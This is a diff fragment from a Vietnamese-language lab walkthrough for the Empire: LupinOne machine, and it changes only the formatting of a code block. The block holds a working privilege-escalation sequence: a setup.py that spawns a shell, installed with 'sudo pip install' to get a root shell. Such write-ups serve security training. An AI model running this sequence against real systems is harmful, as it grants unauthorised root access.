@@ -121,9 +121,9 @@ Nguồn hướng dẫn:[Đây](https://www.hackingarticles.in/empire-lupinone-vu
   
   - Thấy có quyền thực thi nhị phân pip mà không cần xác minh root, tiến hành leo thang đặc quyền:
 
-  ```TF=$(mktemp -d)
+  `TF=$(mktemp -d)
   echo "import os; os.execl('/bin/sh', 'sh', '-c', 'sh <$(tty) >$(tty) 2>$(tty)')" > $TF/setup.py
-  sudo pip install $TF```
+  sudo pip install $TF`
 
   ![image](https://github.com/tninh27/Lab/assets/105789492/055efa6f-b949-4888-9681-f32caf49769e)
 
